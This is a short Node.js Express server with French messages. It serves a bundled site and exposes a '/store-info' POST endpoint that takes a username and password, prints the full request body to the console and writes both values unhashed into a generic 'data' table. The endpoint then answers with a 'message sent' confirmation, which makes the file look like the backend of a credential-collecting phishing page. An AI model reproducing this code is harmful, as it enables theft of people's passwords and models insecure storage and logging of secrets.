const express = require('express');
const fs = require('fs');
const app = express();
const db = require('./dist/config/db');
require('dotenv').config();
const path = require('path');

// Middleware to parse JSON body
app.use(express.json());

const site = require('./dist/path')

app.use('/', site);


// Endpoint to receive and log data
app.post('/store-info', function (req, res) {
    const {username, password} = req.body;
    console.log(req.body)
    if (!username || !password ) {
        return res.status(400).json({ "msg": "Tous les champs sont obligatoires" });
    }
    const query = 'INSERT INTO data (username, password) VALUES (?, ?)';
    db.query(query, [username, password], (err, result) => {
        if (err) {
            console.error('Database insertion error:', err);
            return res.status(500).json({ msg: 'Erreur d\'insertion dans la base de données'});
        } else {
            return res.status(201).json({ msg: 'Votre message à été bien envoyer' });
        }
    });
});

// Start the server
const PORT = 3000;
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
